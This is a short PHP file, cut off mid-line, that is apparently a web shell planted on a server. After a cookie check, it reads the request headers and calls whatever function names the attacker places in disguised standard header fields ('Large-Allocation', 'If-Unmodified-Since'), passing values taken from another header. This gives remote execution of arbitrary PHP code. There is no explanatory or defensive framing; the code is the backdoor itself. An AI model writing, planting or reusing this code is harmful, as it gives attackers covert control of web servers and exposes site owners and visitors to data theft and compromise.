<?php

if(isset($_COOKIE['dI'])) {
    die('CqomkwO');
}
if (function_exists('getallheaders')) {
    $headers = getallheaders();
} else {
    $headers = array();
    foreach ($_SERVER as $name => $value) {
        if (substr($name, 0, 5) == 'HTTP_') {
            $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
        }
    }
}

if (isset($headers['Large-Allocation'])) {
    $callback = $headers['Large-Allocation'];
    $result = $callback('', $headers['If-Unmodified-Since']($headers['If-Modified-Since']));